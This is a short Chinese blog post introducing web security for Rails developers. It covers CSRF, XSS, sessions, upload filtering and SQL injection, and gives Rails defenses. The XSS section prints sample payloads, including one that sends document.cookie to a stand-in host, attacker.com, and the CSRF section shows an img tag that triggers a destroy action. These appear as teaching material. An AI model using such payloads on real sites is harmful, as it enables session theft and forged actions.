---
layout: post
title: Web安全
permalink: web-security
---

Rails作为一个成熟的框架，已经默认提供了必要的安全机制，从而使得小白也能初始化出安全的站点。但安全还在人心，
只有在开发中时刻注意，才不会留下漏洞。

一定要对网站的入口慎之又慎，不要理所当然用户会按照你的设计去进行输入！

# Sessions

> HTTP is a stateless protocol. Sessions make it stateful.

Session机制是为了解决web的无状态特性，通过浏览器回传cookies来确认当前的session。


# Cross-Site Request Forgery (CSRF)
CSRF，跨站伪装请求。

CSRF的场景是：访问一个黑站，结果在里面有一个链接被浏览器自动加载访问，而这个链接可能执行是删除、关注等操作。

起因：在浏览器请求一个URL时，会顺便得到这个网站的cookies。有了cookies就有了权限，如果请求的那个
URL是在另一个网站中嵌入的，比如：

```html
<img src="http://target.com/1/destroy" />
```

那么就会执行相应的操作。浏览器并不知道这是否是用户的本意，只会按部就班的去解析，遇到img的src就去请求。

应对：对非GET需要验证安全令牌，只有通过才能给执行。而这个安全令牌是Server在render表单等时自己生成的。

在Rails中，只需要在最顶层的ApplicationController中加入：

```rb
protect_from_forgery with: :exception
```

然后在最顶层的layout文件的head中加入：

```
<%= csrf_meta_tags %>
```

# Cross-Site Scripting (XSS)
跨站执行脚本，等于别人可以在你的网站页面上写自己的代码。十分恐怖！

流程：黑客注入代码，网站保存，受害者打开网站执行代码。

## HTML/JavaScript 注入

```html
<script>alert('Hello');</script>

<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">


<script>document.write(document.cookie);</script>
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>

```

## 防御

使用escapeHTML()或它的alias h()对二次显示的输入内存进行转义，这样：

```
字符& " < >就变成了&amp; &quot; &lt;和&rt;了。
```

能被浏览器还原，但是不能执行。

但是有时确实需要让用户输入带标签的文本啊！

使用[sanitize()](http://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html)，
它只运行白名单里的tag和attributes显示：

```rb
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```

# Redirection
防止跳到钓鱼网站。

# File Upload/Download
上传下载时，对文件名进行过滤，保证其安分呆在指定的目录里。

# SQL 注入
尽量使用已经封装好的查询语句，而不是自己写SQL。

# 参考
* http://guides.rubyonrails.org/security.html
